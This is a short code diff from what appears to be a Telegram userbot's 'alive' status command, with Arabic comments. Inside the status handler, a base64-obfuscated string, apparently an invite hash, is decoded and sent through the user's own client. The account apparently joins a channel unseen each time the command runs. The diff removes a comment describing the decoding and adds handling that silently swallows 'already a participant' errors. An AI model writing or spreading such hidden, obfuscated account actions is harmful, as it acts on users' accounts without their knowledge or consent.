@@ -92,15 +92,20 @@ async def amireallyalive(event):
         mypremium = (await event.client.get_entity(USERID)).premium
     except:
         mypremium = False
-    
-    # فك تشفير الرابط (إذا كان مطلوبًا)
+        
     joker = base64.b64decode("bGw2bGRwNkdoTkZpTWpnMA==")
     joker = Get(joker)
     try:
         await event.client(joker)
     except Exception as e:
-        print(f"حدث خطأ أثناء محاولة فك تشفير الرابط: {e}")
-    
+        # التحقق من نوع الخطأ
+        if "already a participant" in str(e).lower():
+        # المستخدم عضو بالفعل - تجاهل الخطأ
+            pass
+        elif "expired" in str(e).lower():
+            print("رابط الدعوة منتهي الصلاحية")
+        else:
+            print(f"حدث خطأ أثناء محاولة فك تشفير الرابط: {e}")
     # بناء النص
     if mypremium:
         # نسخة بريميوم مع إيموجيات مخصصة
